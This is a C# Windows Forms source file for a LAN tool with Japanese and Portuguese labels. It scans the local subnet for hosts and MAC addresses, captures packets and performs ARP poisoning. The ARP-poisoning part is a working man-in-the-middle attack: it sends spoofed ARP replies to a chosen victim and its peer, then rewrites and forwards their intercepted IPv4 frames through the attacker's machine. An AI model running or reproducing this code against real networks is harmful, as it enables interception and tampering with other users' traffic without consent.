using System;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using SharpPcap;
using SharpPcap.LibPcap;
using SharpPcap.AirPcap;
using SharpPcap.WinPcap;

namespace NetworkJogo
{
    public partial class frmMain : frmBase
    {

        #region member
        dsNetworkInfo.IPADDR_LISTDataTable _dtList;
        dsNetworkInfo.InterfacesDataTable _dtInterfaces;
        dsNetworkInfo.IPADDR_LISTDataTable _dtResearchBuffer;
        private string _systemMessage;

        //arpp member
        bool _runningArpp;
        private LibPcapLiveDevice _capturePcapLiveDevice;
        private PcapAddress _capturePcapAddr;
        private IPAddress _arppTargetIp;
        private string _arppTargetMac;
        private IPAddress _arppTargetDestIp;
        private string _arppTargetDestMac;
        private int _arppTimer;
        #endregion

        #region コンストラクタ
        public frmMain()
        {
            InitializeComponent();

            _eventRunning = false;
        }
        #endregion

        [System.Runtime.InteropServices.DllImport("Iphlpapi.dll", EntryPoint = "SendARP")]
        internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress, byte[] macAddress, ref Int32 macAddressLength);

        #region Load
        private void frmMain_Load(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                _dtInterfaces = new dsNetworkInfo.InterfacesDataTable();
                cmbInterface.DataSource = _dtInterfaces;
                cmbInterface.DisplayMember = "IPADDR_STR";
                cmbInterface.ValueMember = "IPADDR_STR";

                readLocalInformation();
                lblMessage.Text = string.Empty;

                _dtList = new dsNetworkInfo.IPADDR_LISTDataTable();
                dgvList.DataSource = _dtList;

                _runningArpp = false;
                RPPoisoningToolStripMenuItem.Visible = true;
                packetCaptureToolStripMenuItem.Visible = true;
                gbxArpPoisoningInfo.Visible = true;

            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region 自端末情報表示
        private void 自端末情報表示IToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                frmLocalInterface frm = new frmLocalInterface();
                frm.Show();
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region Pesquisa da rede local
        private void pesquisaDaLocalRedeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                if (cmbInterface.SelectedIndex == -1)
                {
                    showMessage("インタフェース情報が選択されていません。");
                    return;
                }
                DataRow[] rows = _dtInterfaces.Select(string.Format("IPADDR_STR = '{0}'", cmbInterface.SelectedValue.ToString()));
                if (rows == null || rows.Length <= 0)
                {
                    showMessage("インタフェース情報が取得できませんでした。");
                    return;
                }
                dsNetworkInfo.InterfacesRow rowInterface = _dtInterfaces[_dtInterfaces.Rows.IndexOf(rows[0])];
                if (rowInterface.ISIPV6)
                {
                    showMessage("IPv6にはまだ対応していません。");
                    return;
                }

                //調査対象ホスト数算出
                int hostlength = (int)rowInterface.HOST_COUNT;
                int subnetmasklength = rowInterface.SUBNET_MASK_LEN;
                byte[][] hostAddr = new byte[(int)rowInterface.HOST_COUNT][];
                byte[] ifaceSubnetmask = addrString2byteArr(rowInterface.SUBNET_MASK);
                byte[] ifaceNetworkAddr = addrString2byteArr(rowInterface.NETWROK_ADDR);

                for (int j = 0; j < hostlength; j++)
                {
                    hostAddr[j] = new byte[4];
                    for (int k = 0; k < 4; k++)
                    {
                        hostAddr[j][k] = ifaceNetworkAddr[k];
                    }
                    for (int k = 0; k < (32 - subnetmasklength); k++)
                    {
                        int oktetIdx = (int)Math.Abs(Math.Floor((decimal)k / (decimal)8) - (decimal)3);
                        decimal metric = (decimal)Math.Pow(2, (double)(k + 1));
                        hostAddr[j][oktetIdx] |= (byte)(((j % metric) < (metric / 2) ? (byte)0 : (byte)1) << (byte)(k % 8));
                    }
                }


                _dtResearchBuffer = new dsNetworkInfo.IPADDR_LISTDataTable();
                int threadCount = 10;
                int threadWaitLoopCnt = (int)Math.Ceiling((decimal)hostlength / (decimal)threadCount);
                for(int i = 0 ; i < threadWaitLoopCnt ; i++)
                {
                    Thread[] threads = new Thread[((i + 1) == threadWaitLoopCnt ? hostlength - (threadCount * i) : threadCount)];
                    for (int j = 0; j < threads.Length; j++)
                    {
                        threads[j] = new Thread(new ParameterizedThreadStart(researchBaseIPAddr));
                    }
                    for (int j = 0; j < threads.Length; j++)
                    {
                        threads[j].IsBackground = true;
                        threads[j].Start(hostAddr[i * threadCount + j]);
                    }
                    foreach (Thread thread in threads)
                    {
                        thread.Join();
                    }
                }

                _dtList = (dsNetworkInfo.IPADDR_LISTDataTable)dgvList.DataSource;
                _dtList.Clear();
                _dtList.Merge(_dtResearchBuffer);

                showMessage("付近のコンピュータ走査が完了しました。");
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region save IP ADDR List
        private void saveIPAddrListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                string filename = "ipaddrlist.csv";
                SaveFileDialog dialog = new SaveFileDialog();
                dialog.InitialDirectory = "C:\\";
                dialog.FileName = filename;
                dialog.Filter = "CSVファイル(*.CSV)|*.CSV|すべてのファイル(*.*)|*.*";
                dialog.FilterIndex = 1;
                dialog.Title = "IPリストの保存先を選択してください。";
                if (!dialog.ShowDialog().Equals(DialogResult.OK))
                {
                    return;
                }                
                Utility.ConvertDataTableToCsv((DataTable)dgvList.DataSource, dialog.FileName, false);
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region restore IP ADDR List
        private void restoreIPAddrListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                string filename = "ipaddrlist.csv";
                OpenFileDialog dialog = new OpenFileDialog();
                dialog.FileName = filename;
                dialog.InitialDirectory = "C:\\";
                dialog.Filter = "CSVファイル(*.csv)|*.csv|すべてのファイル(*.*)|*.*";
                dialog.FilterIndex = 1;
                dialog.Title = "IPリストファイルを選択してください";
                dialog.RestoreDirectory = true;
                dialog.CheckFileExists = true;
                dialog.CheckPathExists = true;

                if (!dialog.ShowDialog().Equals(DialogResult.OK))
                {
                    return;
                }
                
                dsNetworkInfo.IPADDR_LISTDataTable dt = (dsNetworkInfo.IPADDR_LISTDataTable)dgvList.DataSource;
                System.Collections.ArrayList csvRecords = Utility.convertCsv2DataTable(dialog.FileName);
                if (csvRecords == null || csvRecords.Count <= 0)
                {
                    showMessage("情報が読み込めませんでした。");
                    return;
                }
                foreach (String[] csvRecord in csvRecords)
                {
                    dt.AddIPADDR_LISTRow(csvRecord[0], csvRecord[1],csvRecord[2]);
                }
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region インタフェース情報生成
        private void createInterfaces()
        {
            _dtInterfaces.Clear();
            LocalNetworkInfo info = Utility.LocalNetworkInfo;
            if (info.IPADDRS == null || info.IPADDRS.Length <= 0)
            {
                return;
            }

            for (int i = 0; i < info.IPADDRS.Length; i++)
            {
                IPAddress ipaddress = info.IPADDRS[i];
                bool isIPV6 = false;
                string networkaddrFormated = string.Empty;
                string subnetmaskFormated = string.Empty;
                int subnetmasklength = 0;
                string ipaddrFormated = string.Empty;
                int hostlength = 0;

                //IPv6の場合
                if (ipaddress.IsIPv6LinkLocal || ipaddress.IsIPv6Multicast || ipaddress.IsIPv6SiteLocal || ipaddress.IsIPv6Teredo)
                {
                    ipaddrFormated = ipaddress.ToString();
                    isIPV6 = true;
                }
                else
                {
                    byte[] ipaddrOctet = ipaddress.GetAddressBytes();
                    ipaddrFormated = string.Format("{0:000}.{1:000}.{2:000}.{3:000}", ipaddrOctet[0], ipaddrOctet[1], ipaddrOctet[2], ipaddrOctet[3]);
                    byte[] netmaskOctet = info.NETMASKS[i].GetAddressBytes();
                    subnetmaskFormated = string.Format("{0:000}.{1:000}.{2:000}.{3:000}", netmaskOctet[0], netmaskOctet[1], netmaskOctet[2], netmaskOctet[3]);

                    byte[] networkaddr = new byte[4];
                    subnetmasklength = 0;
                    for (int j = 0; j < 4; j++)
                    {
                        networkaddr[j] = (byte)(ipaddrOctet[j] & netmaskOctet[j]);
                        subnetmasklength += ((netmaskOctet[j] & 0x80) == 0x80) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x40) == 0x40) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x20) == 0x20) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x10) == 0x10) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x08) == 0x08) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x04) == 0x04) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x02) == 0x02) ? 1 : 0;
                        subnetmasklength += ((netmaskOctet[j] & 0x01) == 0x01) ? 1 : 0;
                    }
                    networkaddrFormated = string.Format("{0:000}.{1:000}.{2:000}.{3:000}", networkaddr[0], networkaddr[1], networkaddr[2], networkaddr[3]);
                    hostlength = (int)Math.Pow((double)2, (double)(32 - subnetmasklength));

                    isIPV6 = false;

                }
                dsNetworkInfo.InterfacesRow row = _dtInterfaces.NewInterfacesRow();
                row.IPADDR_STR = ipaddrFormated;
                row.SUBNET_MASK = subnetmaskFormated;
                row.NETWROK_ADDR = networkaddrFormated;
                row.HOST_COUNT = hostlength;
                row.ISIPV6 = isIPV6;
                row.SUBNET_MASK_LEN = subnetmasklength;
                _dtInterfaces.AddInterfacesRow(row);
            }
        }
        #endregion

        #region 自端末情報読み込み
        private void readLocalInformation()
        {
            Utility.gatherLocalNetworkInfo();
            createInterfaces();
            lblInterfaceDesc.Text = string.Empty;
            if (_dtInterfaces.Count != 0)
            {
                cmbInterface.SelectedIndex = 0;
                showInterfaceInfo(_dtInterfaces[0].IPADDR_STR);
            }
        }
        #endregion

        #region インタフェース選択時
        private void cmbInterface_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                if( cmbInterface.SelectedIndex == -1 ) return;
                showInterfaceInfo(cmbInterface.SelectedValue.ToString());
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region インタフェース情報表示
        private void showInterfaceInfo(string ipaddr)
        {
            lblInterfaceDesc.Text = string.Empty;

            DataRow[] rows = _dtInterfaces.Select(string.Format("IPADDR_STR = '{0}'",ipaddr));
            if (rows == null || rows.Length <= 0) return;

            int idx = _dtInterfaces.Rows.IndexOf(rows[0]);

            string desc = string.Empty;
            if (_dtInterfaces[idx].ISIPV6)
            {
                desc = string.Format("NetworkAddr : {0} , Host Count : {1}", _dtInterfaces[idx].NETWROK_ADDR, _dtInterfaces[idx].HOST_COUNT);
            }
            else
            {
                desc = string.Format("NetworkAddr : {0} , Host Count : {1}", _dtInterfaces[idx].NETWROK_ADDR, _dtInterfaces[idx].HOST_COUNT);
            }
            lblInterfaceDesc.Text = desc;
        }
        #endregion

        #region MACアドレス取得
        private String GetMACFromNetworkComputer(IPAddress pIPAddress)
        {
            String lRetVal = String.Empty;
            Int32 lConvertedIPAddr = 0;
            byte[] lMACArray;
            int lByteArrayLen = 0;
            int lARPReply = 0;

            if (pIPAddress.AddressFamily != AddressFamily.InterNetwork)
            {
                return string.Empty;
            }

            lConvertedIPAddr = ConvertIPToInt32(pIPAddress);
            lMACArray = new byte[6]; // 48 bit
            lByteArrayLen = lMACArray.Length;

            if ((lARPReply = SendArp(lConvertedIPAddr, 0, lMACArray, ref lByteArrayLen)) != 0)
            {
                return string.Empty;
            }



            //return the MAC address in a PhysicalAddress format
            for (int i = 0; i < lMACArray.Length; i++)
            {
                lRetVal += String.Format("{0}", lMACArray[i].ToString("X2"));
                lRetVal += (i != lMACArray.Length - 1) ? "-" : "";
            } // for (in...

            return (lRetVal);
        }
        private static Int32 ConvertIPToInt32(IPAddress pIPAddr)
        {
            byte[] lByteAddress = pIPAddr.GetAddressBytes();
            return BitConverter.ToInt32(lByteAddress, 0);
        }
        #endregion

        #region addrString2byteArr
        private byte[] addrString2byteArr(string addr)
        {
            string[] addrArr = addr.Split('.');
            if (addrArr == null || addrArr.Length != 4) return null;
            byte[] ret = new byte[4];
            for(int i = 0 ; i < 4; i++){
                ret[i] = byte.Parse(addrArr[i]);
            }
            return ret;
        }
        #endregion

        #region phigicalAddrString2ByteArr
        private byte[] phigicalAddrString2ByteArr(string physicalAddr)
        {
            string[] addrArr = physicalAddr.Split('-');
            byte[] ret = new byte[addrArr.Length];
            for (int i = 0; i < addrArr.Length; i++)
            {
                ret[i] = byte.Parse(addrArr[i], System.Globalization.NumberStyles.HexNumber);
            }
            return ret;
        }
        #endregion

        #region アドレス基本調査
        public void researchBaseIPAddr(object arg)
        {
            byte[] hostAddr = (byte[])arg;
            string hostIPAddressString = string.Format("{0}.{1}.{2}.{3}", hostAddr[0], hostAddr[1], hostAddr[2], hostAddr[3]);
            string hostName = string.Empty;
            string macAddress = string.Empty;

            macAddress = GetMACFromNetworkComputer(new IPAddress(hostAddr));
            if (macAddress.Equals(string.Empty))
            {
                return;
            }

            try
            {
                System.Net.IPAddress hostIPAddress = System.Net.IPAddress.Parse(hostIPAddressString);
                System.Net.IPHostEntry hostInfo = System.Net.Dns.GetHostByAddress(hostIPAddress);
                hostName = hostInfo.HostName;
            }
            catch (SocketException ex)
            {
            }


            _dtResearchBuffer.AddIPADDR_LISTRow(
                string.Format("{0:000}.{1:000}.{2:000}.{3:000}", hostAddr[0], hostAddr[1], hostAddr[2], hostAddr[3])
                , hostName
                , macAddress);
        }
        #endregion

        #region PacketCapture
        private void packetCaptureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                if (cmbInterface.SelectedIndex == -1)
                {
                    showMessage("インタフェース情報が選択されていません。");
                    return;
                }
                                DataRow[] rows = _dtInterfaces.Select(string.Format("IPADDR_STR = '{0}'", cmbInterface.SelectedValue.ToString()));
                if (rows == null || rows.Length <= 0)
                {
                    showMessage("インタフェース情報が取得できませんでした。");
                    return;
                }
                dsNetworkInfo.InterfacesRow rowInterface = _dtInterfaces[_dtInterfaces.Rows.IndexOf(rows[0])];
                if (rowInterface.ISIPV6)
                {
                    showMessage("IPv6にはまだ対応していません。");
                    return;
                }

                fmPacketCapture frm = new fmPacketCapture(new IPAddress(addrString2byteArr(rowInterface.IPADDR_STR)));
                frm.ShowDialog();
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region ARP Poisoning
        private void RPPoisoningToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                gbxArpPoisoningInfo.Visible = true;
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region start/stop arpp
        private void btnArppExec_Click(object sender, EventArgs e)
        {

            if (isRunningEvent()) return;
            try
            {
                if (_runningArpp)
                {
                    //stop arpp
                    _capturePcapLiveDevice.StopCapture();
                    _capturePcapLiveDevice.Close();

                    _capturePcapAddr = null;
                    _capturePcapLiveDevice = null;

                    _runningArpp = false;
                    txtTargetDestIP.Enabled = true;
                    btnArppExec.Text = "Start";

                    disabledTimer();
                }
                else
                {
                    //start arpp
                    #region initialize interface
                    {
                        if (cmbInterface.SelectedIndex == -1)
                        {
                            showMessage("インタフェース情報が選択されていません。");
                            return;
                        }
                        DataRow[] rows = _dtInterfaces.Select(string.Format("IPADDR_STR = '{0}'", cmbInterface.SelectedValue.ToString()));
                        if (rows == null || rows.Length <= 0)
                        {
                            showMessage("インタフェース情報が取得できませんでした。");
                            return;
                        }
                        dsNetworkInfo.InterfacesRow rowInterface = _dtInterfaces[_dtInterfaces.Rows.IndexOf(rows[0])];
                        if (rowInterface.ISIPV6)
                        {
                            showMessage("IPv6にはまだ対応していません。");
                            return;
                        }
                        if (!initCaptureDriver(new IPAddress(addrString2byteArr(rowInterface.IPADDR_STR))))
                        {
                            showMessage("ドライバが取得できませんでした。");
                            return;
                        }
                    }
                    #endregion

                    #region initialize target ip
                    {
                        if (lblArppTargetIP.Text.Equals(string.Empty))
                        {
                            showMessage("汚染先を選択してください。");
                            return;
                        }
                        _arppTargetIp = new IPAddress(addrString2byteArr(lblArppTargetIP.Text));
                        _arppTargetMac = lblArppTargetMac.Text;
                    }
                    #endregion

                    #region initialize target destination ip
                    {
                        if (txtTargetDestIP.Text.Equals(string.Empty))
                        {
                            showMessage("汚染IPと通信する端末を入力してください。");
                            txtTargetDestIP.Focus();
                            return;
                        }
                        string[] targetDestIParr = txtTargetDestIP.Text.Split('.');
                        if (targetDestIParr == null || targetDestIParr.Length != 4)
                        {
                            showMessage("汚染IPと通信する端末に誤りがあります。");
                            txtTargetDestIP.Focus();
                            return;
                        }
                        string targetDestIpFormated =
                            string.Format(
                                "{0:000}.{1:000}.{2:000}.{3:000}"
                                , toByte(targetDestIParr[0])
                                , toByte(targetDestIParr[1])
                                , toByte(targetDestIParr[2])
                                , toByte(targetDestIParr[3]));
                        DataRow[] rows = _dtList.Select(string.Format("IPADDR_STR = '{0}'", targetDestIpFormated));
                        if (rows == null || rows.Length <= 0)
                        {
                            showMessage("汚染IPと通信する端末が存在しません。");
                            txtTargetDestIP.Focus();
                            return;
                        }
                        int targetDestIdx = _dtList.Rows.IndexOf(rows[0]);
                        _arppTargetDestIp = new IPAddress(addrString2byteArr(_dtList[targetDestIdx].IPADDR_STR));
                        _arppTargetDestMac = _dtList[targetDestIdx].MAC_ADDR;
                    }
                    #endregion

                    _runningArpp = true;
                    txtTargetDestIP.Enabled = false;
                    btnArppExec.Text = "Stop";

                    _capturePcapLiveDevice.OnPacketArrival += OnPacketArrival;
                    int readTimeoutMilliseconds = 1000;
                    _capturePcapLiveDevice.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
                    _capturePcapLiveDevice.StartCapture();

                    _systemMessage = "wait arp request...";
                    _arppTimer = 0;
                    enabledTimer();
                }
            }
            finally
            {
                quitEvent();
            }

        }
        #endregion

        #region ドライバ取得
        private bool initCaptureDriver(IPAddress captureAddr)
        {
            foreach (LibPcapLiveDevice device in LibPcapLiveDeviceList.Instance)
            {
                foreach (PcapAddress addr in device.Interface.Addresses)
                {
                    if (!addr.Addr.ipAddress.ToString().Equals(captureAddr.ToString()))
                    {
                        continue;
                    }
                    _capturePcapAddr = addr;
                    _capturePcapLiveDevice = device;
                    return true;
                }
            }
            return false;
        }
        #endregion

        #region キャスト
        private byte toByte(object value)
        {
            if (value == null) return 0;
            if (value.ToString().Equals(string.Empty)) return 0;
            byte castedValue = 0;
            if (!byte.TryParse(value.ToString(), out castedValue)) return 0;
            return castedValue;
        }
        #endregion

        #region RowEnter
        private void dgvList_RowEnter(object sender, DataGridViewCellEventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                if (e.RowIndex < 0) return;

                if (!_runningArpp)
                {

                    dsNetworkInfo.IPADDR_LISTRow row = (dsNetworkInfo.IPADDR_LISTRow)((DataRowView)dgvList.Rows[e.RowIndex].DataBoundItem).Row;
                    lblArppTargetIP.Text = row.IPADDR_STR;
                    lblArppTargetMac.Text = row.MAC_ADDR;
                }
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region 汚染先通信IPValidating
        private void txtTargetDestIP_Validating(object sender, CancelEventArgs e)
        {
            if (isRunningEvent()) return;
            try
            {
                if (txtTargetDestIP.Text.Equals(string.Empty)) return;

                string[] targetDestIParr = txtTargetDestIP.Text.Split('.');
                if (targetDestIParr == null || targetDestIParr.Length != 4)
                {
                    showMessage("汚染IPと通信する端末に誤りがあります。");
                    e.Cancel = true;
                    return;
                }
                string targetDestIpFormated =
                    string.Format(
                        "{0:000}.{1:000}.{2:000}.{3:000}"
                        , toByte(targetDestIParr[0])
                        , toByte(targetDestIParr[1])
                        , toByte(targetDestIParr[2])
                        , toByte(targetDestIParr[3]));
                DataRow[] rows = _dtList.Select(string.Format("IPADDR_STR = '{0}'", targetDestIpFormated));
                if (rows == null || rows.Length <= 0)
                {
                    showMessage("汚染IPと通信する端末が存在しません。");
                    e.Cancel = true;
                    return;
                }

                lblArppTargetDestMac.Text = _dtList[_dtList.Rows.IndexOf(rows[0])].MAC_ADDR;
            }
            finally
            {
                quitEvent();
            }
        }
        #endregion

        #region キャプチャイベント
        private void OnPacketArrival(object sender, CaptureEventArgs e)
        {
            DateTime now = DateTime.Now;
            int len = e.Packet.Data.Length;
            if (!e.Packet.LinkLayerType.Equals(PacketDotNet.LinkLayers.Ethernet)) return;

            PacketDotNet.Packet packet = null;
            PacketDotNet.EthernetPacket ethPacket = null;
            try
            {
                packet = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);
                ethPacket = (PacketDotNet.EthernetPacket)packet;
                if (ethPacket.Type.Equals(PacketDotNet.EthernetPacketType.Arp))
                {
                    PacketDotNet.ARPPacket arpPacket = (PacketDotNet.ARPPacket)ethPacket.PayloadPacket;


                    Console.WriteLine(string.Format("target : {0} , {1}", arpPacket.TargetProtocolAddress.ToString(), arpPacket.Operation.ToString()));
                    if(arpPacket.Operation.Equals(PacketDotNet.ARPOperation.Request)){
                        if (arpPacket.TargetProtocolAddress.ToString().Equals(_arppTargetIp.ToString())
                            && arpPacket.SenderProtocolAddress.ToString().Equals(_arppTargetDestIp.ToString()))
                        {

                            _systemMessage = "catch target arp...";

                            sendArpResponse(arpPacket);

                            _systemMessage = "poisoning start...";
                            return;
                        }
                        if (arpPacket.SenderProtocolAddress.ToString().Equals(_arppTargetIp.ToString())
                            && arpPacket.TargetProtocolAddress.ToString().Equals(_arppTargetDestIp.ToString()))
                        {

                            _systemMessage = "catch target dest arp...";

                            sendArpResponse(arpPacket);

                            _systemMessage = "poisoning dest start...";
                            return;
                        }
                    }

                }
                if (ethPacket.Type.Equals(PacketDotNet.EthernetPacketType.IpV4))
                {
                    PacketDotNet.IPv4Packet v4Packet = (PacketDotNet.IPv4Packet)ethPacket.PayloadPacket;
                    if (ethPacket.DestinationHwAddress.Equals(_capturePcapLiveDevice.Addresses[1].Addr.hardwareAddress) &&
                        !v4Packet.DestinationAddress.Equals(_capturePcapLiveDevice.Addresses[1].Addr.ipAddress))
                    {
                        if (v4Packet.DestinationAddress.ToString().Equals(_arppTargetIp.ToString()))
                        {
                            _systemMessage = "send poisoninged packet...";
                            sendPoisoningedPacket(ethPacket, new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetMac)));
                            return;
                        }
                        else
                        {
                            _systemMessage = "send poisoninged packet...";
                            sendPoisoningedPacket(ethPacket, new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetDestMac)));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                return;
            }
        }
        #endregion

        #region sendPoisoningedPacket
        private void sendPoisoningedPacket(PacketDotNet.EthernetPacket ethernetPacket , System.Net.NetworkInformation.PhysicalAddress destPhysicalAddress)
        {
            PacketDotNet.EthernetPacket ethernetSendPacket = ethernetPacket;
            ethernetSendPacket.SourceHwAddress = _capturePcapLiveDevice.Addresses[1].Addr.hardwareAddress;
            ethernetSendPacket.DestinationHwAddress = destPhysicalAddress;
            _capturePcapLiveDevice.SendPacket(ethernetSendPacket);
        }
        #endregion

        #region sendArpResponse
        private void sendArppResponse()
        {
            //send to poisoning src
            sendArpResponse(
                new PacketDotNet.ARPPacket(
                    PacketDotNet.ARPOperation.Request
                    , new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetDestMac))
                    , _arppTargetDestIp
                    , new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetMac))
                    , _arppTargetIp));

                    
            //send to poisoning dest
            sendArpResponse(
                new PacketDotNet.ARPPacket(
                    PacketDotNet.ARPOperation.Request
                    , new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetMac))
                    , _arppTargetIp
                    , new System.Net.NetworkInformation.PhysicalAddress(phigicalAddrString2ByteArr(_arppTargetDestMac))
                    , _arppTargetDestIp));
        }

        private void sendArpResponse(PacketDotNet.ARPPacket arpPacketSrc)
        {
            PacketDotNet.EthernetPacket ethernetPacket =
                new PacketDotNet.EthernetPacket(
                    _capturePcapLiveDevice.Addresses[1].Addr.hardwareAddress
                    , arpPacketSrc.SenderHardwareAddress
                    , PacketDotNet.EthernetPacketType.Arp);

            PacketDotNet.ARPPacket arpPacket =
                new PacketDotNet.ARPPacket(
                    PacketDotNet.ARPOperation.Response
                    , arpPacketSrc.SenderHardwareAddress
                    , arpPacketSrc.SenderProtocolAddress
                    , _capturePcapLiveDevice.Addresses[1].Addr.hardwareAddress
                    , arpPacketSrc.TargetProtocolAddress);
            ethernetPacket.PayloadPacket = arpPacket;

            _capturePcapLiveDevice.SendPacket(ethernetPacket);
        }
        #endregion

        #region Timer Enabled
        private void enabledTimer()
        {
            tmrMessage.Enabled = true;
        }
        #endregion

        #region Timer Disabled
        private void disabledTimer()
        {
            tmrMessage.Enabled = false;
        }
        #endregion

        #region MessageShow
        private void tmrMessage_Tick(object sender, EventArgs e)
        {
            lblMessage.Text = _systemMessage;

            //ARPP実行中
            if (_runningArpp)
            {
                if (_arppTimer > 10)
                {
                    sendArppResponse();
                    _arppTimer = 0;
                }
                else
                {
                    _arppTimer++;
                }

            }
        }
        #endregion
    }
}
